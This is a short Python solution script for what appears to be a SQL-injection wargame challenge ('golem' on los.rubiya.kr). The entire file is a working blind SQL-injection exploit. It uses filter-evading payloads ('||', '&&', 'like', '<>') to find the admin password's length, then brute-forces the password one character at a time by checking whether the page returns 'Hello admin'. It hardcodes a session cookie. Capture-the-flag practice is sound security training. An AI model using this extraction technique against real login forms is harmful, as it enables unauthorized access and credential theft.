import requests, string

cookies = { "PHPSESSID": "mb1phjh2magaoc9qipl63b4gs6" }

url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"

password_length = 0

success_text = "Hello admin"

for i in range(1,32):
  payload = "' || id like 'admin' && length(pw)<>%s#" % (str(i))
  params = {"pw": payload}
  r = requests.get(url, params=params, cookies=cookies)
  if success_text not in r.text:
    print("Admin Password length is %s" % (str(i)))
    password_length = i
    break

password = ""

for i in range(password_length):
  for c in string.printable:
    payload = "' || id like 'admin' && pw like '{}%'#".format(password+c)
    params = { "pw": payload }
    r = requests.get(url, params=params, cookies=cookies)
    if success_text in r.text:
      password += c
      print(password)
      break